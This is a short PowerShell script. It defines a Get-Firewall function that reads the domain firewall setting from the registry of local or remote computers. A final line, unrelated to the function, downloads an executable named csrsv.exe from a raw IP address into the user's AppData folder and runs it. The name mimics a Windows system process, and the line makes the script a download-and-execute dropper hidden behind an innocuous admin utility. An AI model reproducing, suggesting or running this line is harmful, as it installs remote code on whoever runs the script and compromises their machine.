


function Get-Firewall {
    param (
        [object]$comps = $env:COMPUTERNAME
    )
    
    foreach ($computer in $comps) {
        try {
            
            
            $status = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', $computer).OpenSubKey('SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile').GetValue('EnableFirewall')
            
            [bool]$status
        } catch [System.Exception] {
            return 'Error'
        }
    }
}

(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

